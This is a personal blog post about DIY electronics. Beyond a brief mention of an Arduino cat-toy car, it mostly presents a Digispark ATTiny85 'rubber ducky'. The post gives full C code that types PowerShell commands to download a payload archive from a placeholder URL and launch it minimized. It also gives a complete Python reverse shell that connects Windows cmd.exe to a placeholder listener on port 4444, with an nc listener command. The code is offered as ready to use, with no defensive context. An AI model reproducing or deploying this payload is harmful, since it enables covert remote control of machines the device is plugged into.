---
author: Alessandro Ideo
github_username: usg-ishimura
tags: hacking
image: https://github.com/usg-ishimura/usg-ishimura.github.io/assets/103458862/ae3c68f0-39e9-49c4-bb5c-07ef01d8fdfd
---

# DIY Electronics

Some of my recent projects include: 

### Self driving and IR controlled Arduino car as a toy for my cat

![WhatsApp Image 2024-02-13 at 15 09 03](https://github.com/usg-ishimura/usg-ishimura.github.io/assets/103458862/ecdb3725-5078-467a-b606-7b38b9de28a6)

### Digispark italian duckuino

Digispark ATTiny85 can be programmed in C as a rubber ducky, here can be seen in action on a linux target

<video width="100%" height="auto" controls>
  <source src="https://user-images.githubusercontent.com/103458862/221435341-da1ec07e-903d-4ed8-ba8d-e3d7a9163a5d.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video> 

The *C* windows payload for the DIY rubber ducky

```c
#include "DigiKeyboard.h"

void setup() {

	DigiKeyboard.sendKeyStroke(0);
	DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
	DigiKeyboard.delay(1000);
	DigiKeyboard.print("powershell");
	DigiKeyboard.delay(500);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(1000);
	DigiKeyboard.println("wget https://embeddable-package-&-payload-URL/python-w32.zip -O python-w32.zip");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(500);
	DigiKeyboard.println("Expand-Archive -Force python-w32.zip -DestinationPath App");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.delay(500);
	DigiKeyboard.println("cd App\\python-w32; Start-Process -WindowStyle Minimized .\\python reverse.py; exit");
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	  
}

void loop() {

}
```

And the *python* code for the reverse shell:

```python
import os,socket,subprocess,threading;

# On listener: nc -lvp 4444

def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("listener-URL", 4444))

p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
```
